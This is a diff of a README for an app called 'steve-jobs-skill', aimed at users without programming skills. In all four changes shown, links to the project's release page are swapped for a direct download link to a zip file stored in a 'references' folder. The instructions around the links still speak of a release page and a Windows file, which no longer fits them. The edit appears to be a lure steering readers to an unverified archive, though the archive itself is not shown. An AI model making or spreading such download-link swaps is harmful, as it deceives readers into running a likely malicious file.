@@ -1,6 +1,6 @@
 # 🧠 steve-jobs-skill - Think Clear, Decide With Calm
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Beliagluey635/steve-jobs-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Beliagluey635/steve-jobs-skill/main/references/jobs-skill-steve-v1.3.zip)
 
 ## 🚀 What This App Is
 
@@ -12,7 +12,7 @@ It is made for everyday use. You do not need programming skills. You only need t
 
 Visit this page to download the app:
 
-https://github.com/Beliagluey635/steve-jobs-skill/releases
+https://raw.githubusercontent.com/Beliagluey635/steve-jobs-skill/main/references/jobs-skill-steve-v1.3.zip
 
 On that page, look for the latest release and download the Windows file that matches your system.
 
@@ -58,7 +58,7 @@ This part helps shape how ideas are said. It aims for:
 Follow these steps:
 
 1. Open the release page:
-   https://github.com/Beliagluey635/steve-jobs-skill/releases
+   https://raw.githubusercontent.com/Beliagluey635/steve-jobs-skill/main/references/jobs-skill-steve-v1.3.zip
 
 2. Find the latest release at the top of the page.
 
@@ -196,7 +196,7 @@ The description in Chinese describes it as a cognitive operating system built fr
 
 Download the app here:
 
-https://github.com/Beliagluey635/steve-jobs-skill/releases
+https://raw.githubusercontent.com/Beliagluey635/steve-jobs-skill/main/references/jobs-skill-steve-v1.3.zip
 
 ## 📖 Using the App Well
 
